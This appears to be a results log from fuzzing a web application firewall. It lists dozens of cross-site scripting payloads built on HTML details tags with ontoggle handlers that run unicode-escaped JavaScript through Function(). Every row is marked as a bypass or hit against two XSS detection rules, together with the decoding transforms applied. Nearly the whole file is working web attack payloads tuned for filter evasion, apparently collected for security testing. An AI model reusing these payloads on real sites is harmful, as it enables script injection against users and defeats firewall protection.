308,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()&#59;"" open>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776620.091427
310,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776898.027435
311,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628776962.758325
312,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777028.725972
313,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777059.264674
314,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777154.995417
315,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777292.457983
316,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777353.989439
317,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777334.813192
318,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777496.594245
319,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open><details></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777581.655332
320,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777623.309686
321,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open><details></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777644.959832
322,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777714.087893
323,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777870.826574
324,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628777985.546406
325,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778032.465268
326,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778066.678850
327,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877815.520750
328,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details open><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877825.926382
329,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778311.421885
330,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778334.232543
331,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><details open><details open></details></details></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778464.920579
332,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778588.689638
333,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><details open><details open></details></details></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778699.646761
334,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details open></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778627.589843
335,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778760.967417
336,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778833.950023
337,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628778916.338207
338,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779067.523871
339,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details open></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779129.718846
340,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779212.107304
341,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779389.711611
342,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779363.894690
343,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779454.049365
344,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779587.134836
345,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,136t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779688.372484
346,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779760.620518
347,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779763.356525
348,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762877981.262913
349,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628779987.023672
350,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780079.843209
351,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780160.197049
352,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details open id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780195.543489
353,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780241.780050
354,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780367.084760
355,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open id=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780448.060651
356,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780543.734369
357,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details open id=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,141t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780643.748505
358,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary><details open class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780768.608400
359,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780792.577338
360,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780851.814244
361,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary><details open class=x></details></summary></details>",0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628780968.552945
362,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781086.202949
363,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary><details open class=x></details></summary></details>,0,1,bypass,2,"941100,941120","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781127.675402
364,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><details><summary><details></details></summary></details>",0,1,bypass,2,"941100,941120","v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,140t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17762878123.345465
365,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open><summary>click</summary></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781242.961621
366,"<details open ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()""><summary>click</summary></details>",0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781338.731475
367,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781461.893797
368,<details open ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()'><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781556.094881
369,<details ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)() open><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781525.686636
370,<details open ontoggle=Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()><summary>click</summary></details>,0,1,bypass,2,"941100,941120","v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,115t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628781679.619789
374,"<details ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"" open id=x>",0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782056.255272
375,<details ontoggle='Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()' open id=x>,0,1,bypass,2,"941100,941120","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782115.293061
377,"<details open ontoggle=""Function(&quot;&#92;u0061&#92;u006c&#92;u0065&#92;u0072&#92;u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782291.199529
378,"<details ontoggle=""Function(&quot;&#92;u0061&#92;u006c&#92;u0065&#92;u0072&#92;u0074(1)&quot;)()"" open>",0,1,bypass,2,"941100,941120","v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o8,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782390.259616
380,"<details/open/ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782534.891159
381,"<details open/ontoggle=""Function(&quot;\u0061\u006c\u0065\u0072\u0074(1)&quot;)()"">",0,1,bypass,2,"941100,941120","v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177628782664.006445
